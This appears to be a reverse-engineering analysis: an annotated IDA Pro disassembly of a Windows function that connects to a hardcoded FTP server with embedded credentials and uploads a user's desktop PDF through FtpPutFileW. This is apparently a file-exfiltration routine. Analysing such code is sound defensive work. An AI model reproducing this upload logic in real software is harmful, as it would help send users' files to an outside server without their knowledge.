# sub_401160 Function

The `sub_401160` function code of the Windows executable being reversed-engineered, as shown in IDA Pro:
    
    .text:00401160 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
    .text:00401160
    .text:00401160 ; Attributes: bp-based frame
    .text:00401160
    .text:00401160 ; int __cdecl sub_401160(wchar_t *lpszLocalFile)
    .text:00401160 sub_401160      proc near               ; CODE XREF: _main+86p
    .text:00401160
    .text:00401160 hInternet       = dword ptr -0Ch
    .text:00401160 lpszNewRemoteFile= dword ptr -8
    .text:00401160 hConnect        = dword ptr -4
    .text:00401160 lpszLocalFile   = dword ptr  8
    .text:00401160
    .text:00401160                 push    ebp
    .text:00401161                 mov     ebp, esp
    .text:00401163                 sub     esp, 0Ch
    .text:00401166                 push    0               ; dwReserved
    .text:00401168                 call    ds:InternetAttemptConnect
    .text:0040116E                 test    eax, eax ; eax = 0h
    .text:00401170                 jnz     loc_40120E
    .text:00401176                 push    0               ; dwFlags
    .text:00401178                 push    0               ; lpszProxyBypass
    .text:0040117A                 push    0               ; lpszProxy
    .text:0040117C                 push    0               ; dwAccessType
    .text:0040117E                 push    0               ; lpszAgent
    .text:00401180                 call    ds:InternetOpenW
    .text:00401186                 mov     [ebp+hInternet], eax ; eax = 00CC0004h
    .text:00401189                 push    0               ; dwContext
    .text:0040118B                 push    8000000h        ; dwFlags
    .text:00401190                 push    1               ; dwService
    .text:00401192                 push    offset szPassword ; lpszPassword
    .text:00401197                 push    offset szUserName ; lpszUserName
    .text:0040119C                 push    15h             ; nServerPort
    .text:0040119E                 push    offset szServerName ; lpszServerName
    .text:004011A3                 mov     eax, [ebp+hInternet]
    .text:004011A6                 push    eax             ; hInternet = 00CC0004h
    .text:004011A7                 call    ds:InternetConnectW
    .text:004011AD                 mov     [ebp+hConnect], eax ; eax = 0h
    .text:004011B0                 mov     ecx, [ebp+lpszLocalFile] ; C:\Users\Derbhle\Desktop\receiptPetrov_9316.pdf
    .text:004011B3                 push    ecx             ; wchar_t *
    .text:004011B4                 call    _wcslen
    .text:004011B9                 add     esp, 4
    .text:004011BC                 mov     edx, [ebp+lpszLocalFile] ; 0040B7C0h, C:\Users\Derbhle\Desktop\receiptPetrov_9316.pdf
    .text:004011BF                 lea     eax, [edx+eax*2] ; eax = 0000002Fh, edx = 0040B7C0h ... eax = 0040B7C4h (0040B81Eh)
    .text:004011C2                 mov     [ebp+lpszNewRemoteFile], eax
    .text:004011C5
    .text:004011C5 loc_4011C5:                             ; CODE XREF: sub_401160+79j
    .text:004011C5                 mov     ecx, [ebp+lpszNewRemoteFile] ; ecx = 0040B81Eh
    .text:004011C8                 movzx   edx, word ptr [ecx] ; edx = 0h
    .text:004011CB                 cmp     edx, 5Ch ; 5Ch unicode: \
    .text:004011CE                 jz      short loc_4011DB
    .text:004011D0                 mov     eax, [ebp+lpszNewRemoteFile] ; eax = 0040B81Eh
    .text:004011D3                 sub     eax, 2 
    .text:004011D6                 mov     [ebp+lpszNewRemoteFile], eax
    .text:004011D9                 jmp     short loc_4011C5
    .text:004011DB ; ---------------------------------------------------------------------------
    .text:004011DB
    .text:004011DB loc_4011DB:                             ; CODE XREF: sub_401160+6Ej
    .text:004011DB                 mov     ecx, [ebp+lpszNewRemoteFile] ; \receiptPetrov_9316.pdf
    .text:004011DE                 add     ecx, 2
    .text:004011E1                 mov     [ebp+lpszNewRemoteFile], ecx ; receiptPetrov_9316.pdf
    .text:004011E4                 push    0               ; dwContext
    .text:004011E6                 push    2               ; dwFlags
    .text:004011E8                 mov     edx, [ebp+lpszNewRemoteFile] 
    .text:004011EB                 push    edx             ; lpszNewRemoteFile - receiptPetrov_9316.pdf
    .text:004011EC                 mov     eax, [ebp+lpszLocalFile]
    .text:004011EF                 push    eax             ; lpszLocalFile - C:\Users\Derbhle\Desktop\receiptPetrov_9316.pdf
    .text:004011F0                 mov     ecx, [ebp+hConnect]
    .text:004011F3                 push    ecx             ; hConnect - 0h
    .text:004011F4                 call    ds:FtpPutFileW
    .text:004011FA                 mov     edx, [ebp+hConnect] ; 0h
    .text:004011FD                 push    edx             ; hInternet - 0h
    .text:004011FE                 call    ds:InternetCloseHandle
    .text:00401204                 mov     eax, [ebp+hInternet]
    .text:00401207                 push    eax             ; hInternet
    .text:00401208                 call    ds:InternetCloseHandle
    .text:0040120E
    .text:0040120E loc_40120E:                             ; CODE XREF: sub_401160+10j
    .text:0040120E                 mov     esp, ebp
    .text:00401210                 pop     ebp
    .text:00401211                 retn
    .text:00401211 sub_401160      endp
    .text:00401211
    .text:00401211 ; ---------------------------------------------------------------------------